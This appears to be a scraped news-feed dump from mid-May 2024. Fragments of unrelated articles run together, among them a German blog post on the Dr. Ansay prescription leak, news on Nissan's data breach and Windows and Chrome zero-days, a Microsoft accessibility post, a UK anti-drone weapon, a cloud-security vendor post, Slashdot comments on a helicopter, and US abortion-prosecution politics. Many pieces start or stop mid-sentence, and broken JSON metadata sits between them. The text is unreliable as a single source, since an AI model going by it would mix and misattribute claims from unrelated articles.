wurde (wohl nach Bekanntwerden) von Seiten des Betreibers am 14.5.24 behoben. Wie lange der betreffende Ordner mit den PDF-Dateien offen zur Indexierung im Internet erreichbar war, wird nicht mitgeteilt.\n-\nLaut der Plattform Dr. Ansay seien nur 20 Prozent der bisher ausgestellten Rezepte \u00fcber die Suchmaschinen DuckDuckGo und Bing auffindbar. Kann ich nicht widerlegen oder best\u00e4tigen.\n-\nIn einem eigenen Absatz versucht der Betreiber zu relativieren \u2013 was aber zumindest vom Streisand Effekt sehr in die Hose gehen d\u00fcrfte. Hier der betreffende Text, den ich mal zur Dokumentation herausziehe:\nDuckDuckGo nutzt die Suchergebnisse von Bing, welche ohne Erlaubnis die Daten von unserem Server gecrawlt und indexiert hat. Das war technisch m\u00f6glich aufgrund eines zu geringen Sicherheitsniveaus, das unbemerkt verursacht wurde von dem Ex-Mitarbeiter Florian K.,\nder zudem mit seinem Partner Maurice F. rechtswidrig die Konkurrenz-Webseite Canngo gestartet hat ohne diese Datenschutzl\u00fccke, aber mit strafbaren Urheberrechts- und Arztpflicht-Verletzungen. Die beiden haben offenbar mit mehreren Fake-Accounts auf Social Media ihre Webseite beworben und als erste die Anleitung zum Abruf der Daten gepostet. Wir stellen Strafanzeigen und halten Euch \u00fcber die Polizei-Ermittlungen auf dem Laufenden.\nDr\u00f6seln wir doch mal die Aussage, die ich auf zwei Abs\u00e4tze gesplittet habe, auf. Die Aussage, dass die Rezepte illegal in den Suchmaschinen gelistet w\u00fcrden, und ohne Erlaubnis des Unternehmen gecrawlt wurden, ist meiner Meinung nach Bullshit vom Feinsten. Der Verantwortliche auf dransay.com ist zwar Jurist (Dr. Jur), sollte sich aber soweit \u00fcber die Technik informieren, dass er zumindest wei\u00df, dass Suchmaschinen-Crawler \u00fcber eine robots.txt ausgeschlossen werden k\u00f6nnen, bevor er solche Aussagen trifft.\nDie Aussage \u00fcber den Ex-Mitarbeiter ist meiner Meinung nach eine Nebelkerze, die mit dem Datenschutzvorfall nichts zu tun hat. Die Strafanzeige in diesem Zusammenhang ist Nebelkerze Nummer 2, was den DSGVO-Vorfall betrifft \u2013 der Start einer angeblichen Konkurrenz-Webseite interessiert in diesem Kontext nicht. Der Fehler wurde beim Betreiber gemacht \u2013 und es ist ein besonders schwerer Datenschutzvorfall nach DSGVO, da besonders sensitive Daten \u00fcber medizinische Sachverhalte von Patienten betroffen sind.\nSchuld sind die Anderen\nFehler k\u00f6nnen passieren \u2013 das Unternehmen k\u00f6nnte dazu stehen. Nun versucht der Betreiber die vermeintliche \"Schuld\" auf Ex-Mitarbeiter sowie die Suchmaschinen abzuw\u00e4lzen und stellt sogar Strafanzeige. Auf elevated.city hat jemand die Schreiben des CEO und Juristen Dr. Ansary an Microsoft und DuckDuckGo ver\u00f6ffentlicht \u2013 die dort ausgesprochenen Drohungen gegen\u00fcber Redmond sind lachhaft (Ansary will Strafanzeige stellen, wenn die Suchergebnisse nicht sofort entfernt werden).\nDer Streisand-Effekt sowie \u00a7203 a ff. werfen nun ihre Schatten voraus. Durch die Strafanzeige wird ein Verfahren bei der Staatsanwaltschaft angesto\u00dfen. Je man Staatsanwaltschaft kann das eingestellt oder mit etwas Aufwand verfolgt werden. Der Vorwurf des \"Aussp\u00e4hens von Daten\" d\u00fcrfte aber bei einer Suchmaschine eher \u2013 auch mit arger Ausdehnung des Rechts \u2013 nicht zu halten sein.\nInzwischen haben auch Golem und heise den Sachverhalt in separaten Artikeln behandelt. Interessant fand ich dort die Information aus der Apothekerzeitung, dass der Betreiber der Plattform bereits eine einstweilige Verf\u00fcgung der Wettbewerbszentral f\u00fcr COVID 19 Online-Testzertifikate erhalten hatte.\nWas kann man tun?\nWas k\u00f6nnen und sollten Betroffene tun? Als erstes eine DSGVO-Auskunft beim Unternehmen anfordern. Dann eine Meldung an die Datenschutzaufsicht absetzen und sich \u00fcber den DSGVO-Vorfall beschweren. Und ggf. einen Anwalt, der sich mit Datenschutzrecht auskennt, kontaktieren, um die Frage eines Schadensersatzes zu kl\u00e4ren (hier hat ein RA ein paar Details dazu ver\u00f6ffentlicht).\nIch habe inzwischen Beschwerde beim Hamburgischen Beauftragten f\u00fcr Datenschutz und Informationsfreiheit wegen des Vorfalls eingereicht.\nSchlechte Reaktion, wird zum Normalfall\nMich erinnert der obige Fall an das Bauhaus-Thema (Datenleck beim Bauhaus-Shop legte Bestellungen von Plus Card-Inhabern offen). Dort hatte ich eine Entdeckung eines Lesers gemeldet, die Leute haben die Schwachstelle geschlossen, aber vergessen, die Daten in Bing.com l\u00f6schen zu lassen (auf meine zweite Eingabe wurde das auch nachgeholt).\nAbsolut ein \"geht gar nicht\" ist in meinen Augen der Versuch des Betreibers der Plattform, \"die Schuld\" anderen zuzuschieben. Hier kann man nur hoffen, dass die unter der Rubrik \"Was kann man tun?\" skizzierten Ma\u00dfnahmen empfindlich greifen.\n\u00c4hnliche Artikel:\nSicherheitsvorf\u00e4lle M\u00e4rz/April 2024 (Stand 9.4.2024)\nDatenleck beim Bauhaus-Shop legte Bestellungen von Plus Card-Inhabern offen\nM\u00f6gliche Schwachstelle bei Ticket-System der Koelnmesse aufgedeckt, gibt es einen 2.

Dabei waren ihnen eure Interessen und Rechte mehr als nur egal. Kein betroffener Patient w\u00fcrde doch das Ganze in die \u00d6ffentlichkeit treten und damit seine eigenen Daten publik machen.

Bin mal gespannt, ob das irgendwelche Konsequenzen f\u00fcr den Betreiber hat (z.B. Bu\u00dfgeld). Das Fehler passieren k\u00f6nnen ist klar, aber die Reaktion zeugt nicht gerade von Einsicht.\nWas f\u00e4llt mir da als erstes ein?\nDer Wahlspruch von Lindner:\n\"Digitalisierung first, Bedenken second.\"\nMacht ruhig weiter so :D\n1.\n[Born:] dass Suchmaschinen-Crawler \u00fcber eine robots.txt ausgeschlossen werden k\u00f6nnen,\nAus WP: A robots.txt has no enforcement mechanism in law or in technical protocol, despite widespread compliance by bot operators.\n2.\n[Ansay:] gecrawlt und indexiert hat.

The attacker did not encrypt data or disrupt any systems, but it did steal files from local and network shares and demanded a ransom.\nAn initial investigation showed that the files potentially accessed by the hackers only contained business information. However, in late February 2024, Nissan determined that the compromised files did include personal information, mainly related to current and former employees, including names and social security numbers.\nThe company says it\u2019s not aware of any instances of fraud or identity theft resulting from the incident, but it has decided to provide free protection services to impacted employees.\nThe carmaker told the Maine Attorney General\u2019s Office that just over 53,000 individuals are impacted by the data breach.\nNissan North America previously disclosed a data breach in January 2023, when it informed roughly 25,000 customers that their personal information was exposed in a data breach at a third-party services provider.\nAt around the time of the latest cyberattack targeting Nissan North America, Nissan Oceania was also hit by ransomware. The Akira ransomware group took credit for that attack, claiming to have stolen 100 Gb of information.\nThe incident, which impacted Nissan Motor Corporation and Nissan Financial Services in Australia and New Zealand, was initially said to affect roughly 100,000 individuals.\nNo ransomware group appears to have taken credit for the newly disclosed Nissan North America attack and it\u2019s unclear if the two incidents are related.\nCommenting on the incident, Venky Raju, field CTO at ColorTokens, noted that there is a growing trend of these types of \u2018smash and grab\u2019 attacks, \u201cwhere hackers are getting in, grabbing whatever they can find, and getting out\u201d.\n\u201cThe data is sifted and then sold on the dark web or it is being used by the same actors as part of their reconnaissance,\u201d Raju explained.\n\u201cSmash and grab attacks rely on speed and ease of lateral movement within the network, as the adversary wants to find useful data quickly to avoid detection. Implementing microsegmentation prevents, or will significantly slow down, the ability of the adversary to achieve their objectives, providing the security team with valuable time to detect and respond,\u201d the expert added.\nRelated: Hackers Earn $1.3M for Tesla, EV Charger, Infotainment Exploits at Pwn2Own Automotive\nRelated: Nissan Canada Informs 1.1 Million Customers of Data Breach\nRelated: Biden Administration Will Investigate National Security Risks Posed by Chinese-Made \u2018Smart Cars\u2019", "hash": "e16ed460001f112de6a39c8a6aeed26e8997dafb5b7b779ea71615b3a12c0c06", "id": "e344f1bc-b590-4f97-b28d-659ef34df9b2", "link": "https://www.securityweek.com/nissan-data-breach-impacts-53000-employees/", "osint_source_id": "12f6122e-c3f7-4d6c-813e-db39f757e369", "published": "2024-05-16T13:26:07", "source": "https://feeds.feedburner.com/Securityweek?format=xml", "story_id": "f3eb30c3-715b-4599-a313-b6a40e225807", "title": "Nissan Data Breach Impacts 53,000 Employees"}], "tags": {"Australia": {"name": "Australia", "tag_type": "Country"}, "CTO": {"name": "CTO", "tag_type": "ORG"}, "Canada": {"name": "Canada", "tag_type": "Country"}, "Chinese-Made": {"name": "Chinese-Made", "tag_type": "MISC"}, "Data breach": {"name": "Data breach", "tag_type": "Cybersecurity"}, "EV Charger": {"name": "EV Charger", "tag_type": "ORG"}, "Infotainment Exploits": {"name": "Infotainment Exploits", "tag_type": "ORG"}, "New Zealand": {"name": "New Zealand", "tag_type": "Country"}, "Nissan": {"name": "Nissan", "tag_type": "ORG"}, "Nissan North America": {"name": "Nissan North America", "tag_type": "ORG"}, "Raju": {"name": "Raju", "tag_type": "PER"}, "Tesla": {"name": "Tesla", "tag_type": "ORG"}, "VPN": {"name": "VPN", "tag_type": "MISC"}, "Venky Raju": {"name": "Venky Raju", "tag_type": "PER"}, "ransomware": {"name": "ransomware", "tag_type": "Cybersecurity"}}, "title": "Nissan Data Breach Impacts 53,000 Employees"}, {"attributes": [], "created": "2024-05-16T13:23:01", "id": "fdc7dbfc-7686-4d64-9154-e17a69ccc908", "news_items": [{"author": "", "content": "Besuchen Sie Golem.de wie gewohnt mit Werbung und Tracking, indem Sie der Nutzung aller Cookies zustimmen.

Entdeckt wurde die Schwachstelle von zwei Forschern von Kaspersky, nachdem am 1. April ein auf VirusTotal hochgeladenes Dokument ihre Aufmerksamkeit erweckte. Es f\u00fchrte sie schlie\u00dflich zu der neuen Zero-Day-L\u00fccke und einer neuen Malware-Kampagne mit dem Banking-Trojaner QakBot.\nDas Dokument mit einem aussagekr\u00e4ftigen Dateinamen wies auf eine potenzielle Sicherheitsl\u00fccke im Windows-Betriebssystem hin. Trotz des gebrochenen Englisch und der fehlenden Details wie die Schwachstelle ausgel\u00f6st werden kann, beschrieb das Dokument einen Exploit-Prozess, der dem Zero-Day-Exploit f\u00fcr CVE-2023-36033 glich, obwohl sich die Schwachstellen voneinander unterschieden. Das Team vermutete, die Sicherheitsl\u00fccke sei entweder erfunden oder nicht ausnutzbar. Trotzdem setzte es seine Untersuchung fort. Eine schnelle \u00dcberpr\u00fcfung ergab jedoch, dass es sich tats\u00e4chlich um eine Zero-Day-Schwachstelle handelt, die zu einer Ausweitung der Systemprivilegien f\u00fchren kann.\nNach der Meldung ihrer Erkenntnisse an Microsoft und der Best\u00e4tigung der Schwachstelle begannen die Experten von Kaspersky die Exploits und Angriffe, die diese Zero-Day-Schwachstelle nutzen, n\u00e4her unter die Lupe zu nehmen. Mitte April entdeckte das Team einen Exploit f\u00fcr CVE-2024-30051 und beobachtete seine Verwendung in Verbindung mit QakBot sowie anderer Malware. Kaspersky geht deswegen davon aus, dass mehrere Bedrohungsakteure Zugriff auf diesen Exploit haben.\n\u201eWir fanden das Dokument auf VirusTotal aufgrund seines aussagekr\u00e4ftigen Charakters sehr interessant und haben es deshalb n\u00e4her untersucht. So konnten wir diese kritische Zero-Day-Schwachstelle entdecken\u201c, sagte Boris Larin, Principal Security Researcher bei Kaspersky. \u201eDie Geschwindigkeit, mit der Bedrohungsakteure diesen Exploit in ihr Arsenal integrieren, unterstreicht wie wichtig es ist, rechtzeitig Updates vorzunehmen und insgesamt immer wachsam zu bleiben, was die Cybersicherheit betrifft.\u201c\nDie fragliche Zero-Day-L\u00fccke steckt in der Window DWM-Core-Bibliothek. Ein Angreifer kann unter Umst\u00e4nden System-Rechte erlangen. Betroffen sind alle unterst\u00fctzten Version von Windows 10 und Windows 11 sowie Windows Server 2016, 2019 und 2022. Die Zero-Day-Initiative vermutete bereits Anfang der Woche, dass diese Sicherheitsl\u00fccke nicht ausschlie\u00dflich f\u00fcr zielgerichtete Attacken eingesetzt wird.\nNeueste Kommentare\nNoch keine Kommentare zu Hacker greifen Zero-Day-L\u00fccke in Windows mit Banking-Trojaner QakBot an\nKommentar hinzuf\u00fcgenVielen Dank f\u00fcr Ihren Kommentar.\nIhr Kommentar wurde gespeichert und wartet auf Moderation.", "hash": "790b3ef4b1a170182a451c7c3302716eb0634015e740041dcd6ee224134f4594", "id": "5889231a-63c1-4d8f-bb9f-a30133463c0a", "link": "https://www.zdnet.de/88416000/hacker-greifen-zero-day-luecke-in-windows-mit-banking-trojaner-qakbot-an/?utm_source=rss&utm_medium=rss&utm_campaign=rss", "osint_source_id": "7195190e-601d-4ad8-8f5d-e95cbb21931b", "published": "2024-05-16T13:13:59", "source": "https://www.zdnet.de/kategorie/security/feed/", "story_id": "4fd3d2fa-2a51-4c0a-999d-452fe82d6a14", "title": "Hacker greifen Zero-Day-L\u00fccke in Windows mit Banking-Trojaner QakBot an"}], "tags": {"Boris Larin": {"name": "Boris Larin", "tag_type": "PER"}, "CVE-2023-36033": {"name": "CVE-2023-36033", "tag_type": "cves"}, "CVE-2024-30051": {"name": "CVE-2024-30051", "tag_type": "cves"}, "Kaspersky": {"name": "Kaspersky", "tag_type": "ORG"}, "Microsoft": {"name": "Microsoft", "tag_type": "ORG"}, "Windows": {"name": "Windows", "tag_type": "MISC"}, "Windows 10": {"name": "Windows 10", "tag_type": "MISC"}, "Windows Server": {"name": "Windows Server", "tag_type": "MISC"}, "zero-day": {"name": "zero-day", "tag_type": "Cybersecurity"}}, "title": "Hacker greifen Zero-Day-L\u00fccke in Windows mit Banking-Trojaner QakBot an"}, {"attributes": [{"created": "2024-05-16T17:16:24.168745", "id": "b5b23c2e-ffc6-4b05-afec-b08d7dccb7c0", "key": "WORDLIST_BOT", "value": "1"}, {"created": "2024-05-16T17:17:53.072797", "id": "de29a923-9387-4131-b20a-8cc0fbc64739", "key": "IOC_BOT", "value": "10"}, {"created": "2024-05-16T17:18:48.550785", "id": "bb35c247-4b71-4322-af5e-1b05a4bae87c", "key": "NLP_BOT", "value": "25"}], "created": "2024-05-16T13:11:33", "id": "92bebc54-acd2-4893-b84a-55419358fcff", "news_items": [{"author": "Pierluigi Paganini", "content": "Google fixes seventh actively exploited Chrome zero-day this year, the third in a week\nGoogle released security updates to address a new actively exploited Chrome zero-day vulnerability, the third in a week.\nGoogle has released a new emergency security update to address a new vulnerability, tracked as CVE-2024-4947, in the Chrome browser, it is the third zero-day exploited in attacks that was disclosed this week.\nThe vulnerability CVE-2024-4947 is a type confusion that resides in V8 JavaScript engine.

According to the World Health Organization, more than one billion people live with some form of disability, and they often face barriers to access information, education, employment, health care, and social services. Technology can play a vital role in bridging these gaps and enhancing the quality of life for people with disabilities. In particular AI can offer innovative solutions to overcome some of the challenges and limitations that people with disabilities face in their daily lives. Therefore, it is important to involve people with disabilities in the design, development, and evaluation of AI applications, and to ensure that AI is aligned with the principles of human rights, dignity, and diversity.\n \nTechnology and AI can help people with disabilities in various ways, such as:\n\nAssistive technology: Providing AI-powered tools such as speech recognition, text-to-speech, computer vision, and natural language processing. \nAccess to learning: Enabling accessible and personalized learning experiences that can adapt to the needs and preferences of learners with disabilities, such as adaptive curriculum, interactive feedback, and gamification. \nCommunication tools: Facilitating better communications through tools such as chatbots, digital assistants, online platforms, and smart devices that can help empower people socially and on the job.\n\n \nIn our work at Microsoft, we have the honor of partnering with a variety of nonprofit organizations where technology and AI innovations are helping drive inclusion and productivity for those with disabilities.\n \nSpecial Olympics International (SOI) is leveraging technology to help empower athletes. To build a digital athlete registration portal as part of its new Center of Excellence, the SOI technology team examined\u202fhow SOI athletes and SOI employees with intellectual and developmental disabilities navigated different websites\u202fand external registration systems. To help athletes and employees register independently, the SOI team took the observations and feedback from their focus groups into consideration when creating a\u202fstreamlined athlete registration portal and designed it to be easy to\u202fnavigate.\u202fSimple adjustments such as reducing the options to click away, asking only one question at a time, gamifying the process by awarding medals for completing portions of the registration, and making it screen-reader compatible are helping ensure a more inclusive, productive experience for athletes to self-register and partake in the competition, community and fun.\n \nGoodwill Industries of Orange County and its e-commerce platform Shopgoodwill.com are serving their communities by empowering people who want to work, no matter their station in life. Whether they\u2019re a veteran returning to the workforce, a person with a mental health diagnosis, or someone with a physical or intellectual disability, Goodwill will help them find employment.\n \nThe Shopgoodwill.com e-commerce platform is using AI as a productivity tool for the process of photographing, identifying, and cataloging items to be sold on their website. Employees use smart devices with custom vision to capture imagery and classify the item, which then uses computer vision to extract information from elements such as the material label and merchandise tags that get fed into a large language model that helps catalog the item and ready it for sale. For employees with disabilities, this type of AI functionality is transformative. It can make the actual day-to-day of the job easier, expand the number of people who are able to fill these types of roles, and help drive increased revenue to fund the program.\n \nFurther recognizing the power or AI, Goodwill\u2019s workforce development teams are in the beginning stages of leveraging AI to more accurately work with their employment program participants to put them into scenarios and working environments that will help them achieve their best by optimizing past performance capabilities with available jobs and pairing individuals with the right opportunities. \n \nDigital technology and AI can create more inclusive and accessible solutions that can empower people with disabilities to achieve their goals and aspirations. We are proud to work with and support nonprofit organizations with technology that enables greater accessibility to help create a more inclusive and equitable world.\n \nLearn more\n \nFor more information about Microsoft responsible AI principles, read more here: Empowering responsible AI practices | Microsoft AI.

So werden immer wieder vergleichsweise billige Angriffsdrohnen um ein paar Zehntausend Euro mit Raketen abgewehrt, die ein Vielfaches davon kosten. Eine L\u00f6sung f\u00fcr dieses Problem sind Energiewaffen. Nun hat die britische Regierung eine solche Radio Frequency Directed Energy Weapon (RFDEW) pr\u00e4sentiert.\n\u27a4 Mehr lesen: Zerst\u00f6rer schie\u00dft Huthi-Drohne mit \"Super Rapid\"-Kanone ab\nUmgerechnet lediglich 12 Euro Cent kostet ein Schuss mit der RFDEW. Das macht sie zu einer extrem kosteng\u00fcnstigen Alternative f\u00fcr konventionelle Luftabwehrsysteme, wie es hei\u00dft. Die Waffe selbst weise zudem einen so hohen Automatisierungsgrad auf, dass sie von nur einer einzelnen Person gesteuert werden kann. Die britische Regierung spricht von einem \u201cGamechanger\u201d.\nZuvor berichtete der Milit\u00e4rblogger Gabriele Molinelli von der neuen Entwicklung. Er teilte entsprechende Fotos auf Twitter:\nDas grundlegende Prinzip der RFDEW \u00e4hnle dabei der US-Mikrowellenwaffe Leonidas. Anstatt eines gerichteten Strahls, wie bei Lasern, wirken Mikrowellenwaffen kegelf\u00f6rmig. Sie decken also einen gr\u00f6\u00dferen Bereich ab. In weniger als einer Sekunde st\u00f6ren die Mikrowellen elektronische Systeme. So rei\u00dft etwa die Verbindung zwischen Drohne und Fernsteuerung ab, die Drohne kommt vom Kurs ab oder f\u00e4llt vom Himmel, weil die Elektronik komplett geschmort wurde. Im Unterschied zu Lasern sind die Mikrowellenwaffen au\u00dferdem weniger wetterabh\u00e4ngig.\nDie neue Waffe k\u00f6nne demnach auf einer Vielzahl von Milit\u00e4rfahrzeugen montiert werden. Die Stromversorgung ist dabei ebenfalls mobil, die Abwehrwaffe kann also \u00fcberall eingesetzt werden. Wenn mehrere Drohnenschw\u00e4rme hintereinander angreifen, k\u00f6nnen sie mit schnellen aufeinanderfolgenden Sch\u00fcssen abgewehrt werden. Das neue Waffensystem wird im Sommer umfangreichen Tests mit britischen Soldaten unterzogen, wie es hei\u00dft.\nTeure Abwehr\nDie Dimensionen bzw. die Kosten von Flugabwehr wurden Milit\u00e4rs in der Ukraine sehr deutlich vor Augen gef\u00fchrt. Eine Rakete des deutschen Flugabwehrsystem IRIS-T SLM, das auch in die Ukraine geschickt wurde, kostet etwa rund 400.000 Euro. Die russischen Drohnen, die sie abwehren, kosten nur einen Bruchteil. Der Preis einer Lancet-Drohne, die vom staatlichen R\u00fcstungskonzern Kalaschnikow hergestellt wird, wird auf unter 50.000 Euro gesch\u00e4tzt.\n\u27a4 Mehr lesen: Russische Kamikaze-Drohne ist \"unm\u00f6glich abzufangen\"\nEin \u00e4hnliches Problem zeigte sich im Roten Meer auf. Jemenitische Huthi-Rebellen schie\u00dfen dort ebenfalls mit vergleichsweise billigen Drohnen auf Schiffe, die dann mit teurer Flugabwehr abgefangen werden m\u00fcssen. In Gro\u00dfbritannien hat man f\u00fcr dieses Szenario auch schon Laserwaffen getestet.

Let\u2019s take a look\u2026\nOur newly released Cloud Security Report showed a startling trend in the data. Data breaches have now surpassed misconfigurations as the chief cause of concern in terms of cloud security incidents \u2014 And it\u2019s no wonder\u2026\nLast year it was reported that almost half of companies have at least one database or storage asset exposed to the public internet. While this isn\u2019t necessarily a bad thing, when you add in the prevalence of misconfigurations, vulnerabilities, and the like\u2026the potential for a breach begins to grow rapidly.\nSo, I think it\u2019s fair to say that data security should be a top concern for everyone, but what does a good data security posture management (DSPM) strategy look like?\nAllow me to walk you through it.\n1. Discovery and visibility\nI feel like I\u2019m constantly saying the same things. No matter what content I am creating, if it has to do with cloud security, the leading principle is visibility. \u201cYou cannot protect what you cannot see\u201d. This holds true to data security as well. So, how does this happen? The TLDR is that data security services provide pre-configured criteria, that when met, signifies data as \u2018sensitive\u2019. Most services like this also allow you to create custom criteria as well, and in some cases, you can combine the two. These criteria, when combined with machine learning and meta data clustering allow us to accurately identify any sensitive data in our storage environments.\n2. Classification\nI won\u2019t stay on this point for too long. Technically, this step occurs just after data is identified (although to most users it will feel like it occurs simultaneously). It is then classified based on the triggering criteria i.e. a string of numbers is identified as sensitive because it meets the criteria for a social security number, then it is classified as PII. The best way to see this in action is to test it. You can spin up an S3 bucket, fill it with \u2018dummy data\u2019 and watch your DSPM job detect, and label based on the criteria that you specified.\n3. Context and monitoring\nOnce our data has been discovered and classified, we need to gain more contextual information about it. \u201cWhere does this live by default?\u201d \u201cWhere has it been copied or moved to?\u201d \u201cWho is accessing my data?\u201d. These are just a few examples of the information that a good data security solution will start to gather. This helps the LLM\u2019s to establish patterns or baselines so that the data can be monitored effectively. Continuous monitoring is required for certain data protection regulations, so special attention should be paid to your monitoring and logging capabilities.\n4. Contextual risk assessment\nNot all data is equally sensitive. For example, my personal email address being leaked is nowhere near as concerning as my social security number. Having tools in place that can rank data based on its sensitivity is a must here. To take it a step further, a security platform, like CloudGuard CNAPP can alert you to your riskiest assets based on several different factors to ensure that your attention is on the security risks that can really hurt you. This leads me into the final step of a good DSPM strategy.\n5. Remediation and Response\nDSPM is largely preventative in nature, but that doesn\u2019t mean that you shouldn\u2019t be prepared in case of an incident. A good strategy will identify and analyze the risks to your data, and help you triage which assets need priority remediation, and which ones can wait. With this knowledge, your DevOps and SecOps teams are able to better collaborate together to ensure that high risk assets are remediated quickly, and that productivity is not impacted in a negative way.\nGreat! What now?\nThe good news is that even though data security is technically complicated, it\u2019s easy to get the protection you need. Check Point has partnered with industry leaders in the data security space, including Amazon Macie, Microsoft Purview, and we\u2019ve a newly announced partnership with Sentra.

The $217 million Racer is a one-off demonstrator model combining traditional overhead rotors with two forward-facing propellors in a bid to combine stability and speed, shortening response times for critical missions like search-and-rescue. \"There are missions where the quickest possible access to the zone is vital. We often talk about the 'golden hour',\" Airbus Helicopters CEO Bruno Even told Reuters, referring to the window considered most critical for providing medical attention. Such designs could also be offered for military developments as NATO conducts a major study into next-generation helicraft, though much depends on how its planners define future needs.

Leonardo is also leading a separate project to develop the next generation of tilt-rotors for civil use. Its AW609 is the sole existing civil design, but has yet to be certified. Proponents of the tilt-rotor, which relies on swiveling side-mounted rotors 90 degrees to go up and then forwards, say it permits higher speed and range that are suited to military missions. Critics say the tilt mechanism reaches higher speeds only at the expense of higher complexity and maintenance costs. Airbus said the Racer will fly at 220 knots (400 km/hour) compared with traditional helicopter speeds closer to 140 knots. Bell says its V-280 Valor tilt-rotor design, recently picked by the Pentagon, will reach a cruise speed of 280 knots.

Watch: Racer - Inside the high speed demonstrator (YouTube)\nFast helicopter, you say? (Score:3)\nBut it seems somewhat familiar. From almost 60 year ago:\nhttps://en.wikipedia.org/wiki/... [wikipedia.org]\nWith almost identical performance specifications. This idea of what is called a \"compound helicopter\" which combines mostly-helicopter design with wings and forward propulsion of a conventional airplane . Helicopters tend to be limited in speed because with forward speed, one blade it swinging forward and getting the forward speed + the speed of the rotor on one side, and forward speed - speed of the rotor on the other. This means that it gets way more lift on the forward0travelling side and way less on the trailing side. This would roll it to one side, and requires the blade pitch angle to be driven up and down as the blade rotates.\nPutting on a small wing and conventional propellor (or two) allows some roll control and some lift and unloads the demands on the rotor to something practical. 220 knots (about 250 mph) is going to be about the limit.\nBeyond that, the entire idea becomes impractical and other deigns like tiltrotors (V-22 Osprey) and dual mode/vectord thrust jets (Harrier, F-35B) are required.\nWhats old is new again (Score:2)\nAt least for Marketing purposes. Sikorsky also did something similar in 2019.\nGiven many prototypes of this sort of thing have been done in the past and none went to production it seems fairly obvious to me that the minor 50 or so knot gains in max speed weren't worth the extra expense, complexity and weight. Bear in mind those extra props and wing structure arn't light and will reduce the max hovering load considerably.\nObviously the extra 100+ knots extra speed with a V22 are worth the money for the militar\nRe: (Score:2)\nIt's not a bad solution for this particular case, and the fact that it is in no way a new idea doesn't change the utility of it very much.\nIt turns out the range of applications for which you need this sort of capability is very limited. The Cheyenne was fast - but conventional helicopters were fast enough for an attack helicopter (like the Huey Cobra). It was too slow for most airplane purposes. So there is a very small niche where this sort of slightly-faster-than-normal helic\nRe: (Score:3)\nAnd from the 1950s, the Fairey Rotodyne [wikipedia.org] was a very similar craft.\nRaider, Defiant, etc. (Score:4, Interesting)\nHi, I'm an FAA certificated commercial helicopter pilot.\nThere is a huge difference between tilt-rotor systems that trade lift for thrust. This is not a half-plane nor a half-copter, so I'm sorry for the misleading title BeauHD put on it, but you know, new slashdot and all that.\nIt has none of the particulars that make a fixed-wing aircraft (\"a plane\") a plane. To be exact it lacks fixed-wings. It uses a rotating set of blades to create a plane of a lifting system, and one that can also provide thrust in 360 of rotation. (In case that's not clear, your $30 \"drone\" can go forward, back, right, and left. A real rotorcraft can translate in any direction).\nYet it has a prop. Two even. It doesn't matter if they're pusher props or puller props -- they are efficient at getting horizontal translation (thrust or airspeed if you prefer) without removing power from the main rotor assembly which is providing lift. This means the typical tradeoff of \"well we could increase our forward airspeed but we'd lose some altitude\" doesn't have to happen.\nIs this new? No. The Raider, Defiant, and the H160 (formerly X-4) are all the same concept. Is it a bad concept? No. If you can keep people from walking into the prop then it makes no difference if the airframe is that of a helicopter (this one is) or a fixed-wing model.\nSo... WHY OH WHY would you put a prop on a helicopter instead of putting a rotor on a fixed-wing? The answer is a tradeoff of flexibility vs airspeed. The fixed-wing would do well at higher speeds because it has no retreating blade stall (one half of the rotor is always going \"backward\" \"with\" the airflow over the airframe). The rotary wing would be able to hover, land in very very short airfield conditions, and use a crapton more fuel.\nThis is news. Airbus is releasing yet another X-4 variant. Military services will buy these.

Jackson\u2019s Women\u2019s Health Organization, many Republican dominated state governments quickly moved to ban all or some abortions. Many of the populous cities in these state, however, are dominated by Democratic Party politics. In those cities, elected prosecutors pledged not to prosecute reproductive care, setting up a clash with state-level governments.\nThe clash came first in Florida, where in 2022, Republican Gov. Ron DeSantis became the first state official to suspended an elected prosecutor who said they would not charge people who sought abortions. In January, a three-judge federal appeals circuit panel said DeSantis\u2019s decision to suspend Former States Attorney Andrew Warren violated First Amendment provisions for protected speech, including Warren\u2019s comments on protecting abortion and transgender care.\n\u201cThose prosecutors who have recognized that they have no place interfering with patients\u2019 personal decisions have found themselves under threat.\u201d\nSince then, at least five states have introduced legislative measures to strip power from elected prosecutors who have made similar pledges. Over the last two years, Republicans in Georgia, Idaho, Indiana, South Carolina, and Texas have introduced or passed legislation making it easier to prosecute people who seek abortions.\n\u201cAs reproductive health care became criminalized in the wake of Dobbs, prosecutors around the country became a front line for this essential right,\u201d said Jill Habig, founder and CEO of the the Public Rights Project. \u201cThose prosecutors who have recognized that they have no place interfering with patients\u2019 personal decisions have found themselves under threat for that decision.\u201d\nOn Thursday, the Public Rights Project released a report tallying and detailing a wave of new attacks against prosecutors vowing to defend abortion rights. The attacks target democratically elected prosecutors for routine speech about practices in their offices. In Florida, Warren was suspended in part because of his statements on the right to abortion. In Texas, lawmakers who launched a petition to remove Travis County District Attorney Jose Garza also cited his pledge not to prosecute abortion care.\nThe new research by Public Rights Project shows that the salvos against supporters of abortion rights are just part of a growing, nationwide right-wing effort to limit the powers of elected, reform-minded prosecutors. Since early 2023, there have been 53 attempts to restrict prosecutorial authority in 26 states \u2014 attempts that are increasingly effective, with 15 new measures enacted in the same time period.\nIdaho, Georgia, and More\nThe recent pushes to strip power from prosecutors who support abortion rights have seen some successes. In Idaho, if an elected prosecutor has a policy in place not to prosecute violations of the state\u2019s abortion ban, a law enacted last year would give the state attorney general power to take over any related cases.\nA similar bill was proposed in South Carolina last year but died in committee.\nIn Texas, at least four bills would create new and severe criminal offenses for abortion care and give the state attorney general power to bring criminal prosecutions and sue over related cases.\nA Georgia law enacted last year gives a politically-appointed commission the power to remove and discipline elected DAs over decisions not to prosecute certain offenses, including abortions.\nOther states have fought to curb the attacks on abortion care. A proposed bill in Wisconsin would give the state attorney general concurrent jurisdiction to take over certain prosecutions that target people who seek abortions under the state\u2019s law prohibiting abortions from 22 weeks.\nIn Arizona, state officials are deliberating on efforts to block the repeal of an 1800s-era abortion ban. Democratic Gov. Katie Hobbs issued an executive order in 2023 giving all duties related to prosecuting abortion care over to the state attorney general, a Democrat who supports protecting the right to abortion.\nTons of New Bills to Curb DAs\nThe anti-abortion measures are the outgrowth of a broader national attack on elected prosecutors who ran on reform policies. National Republicans have fomented and harnessed a backlash to candidates who ran on ending cash bail, declining to prosecute cannabis possession, overturning wrongful convictions and prosecuting police misconduct.\nLast year, the Public Rights Project and Local Solutions Support Center released a report that outlined efforts to curb the power of reform-minded prosecutors. The research released about restricting prosecutors who vow to defend abortion rights was part of a new paper that updated last year\u2019s tally.\nMore than 37 bills to strip power from prosecutors were introduced in 17 states between 2017 and early 2023. Some singled out 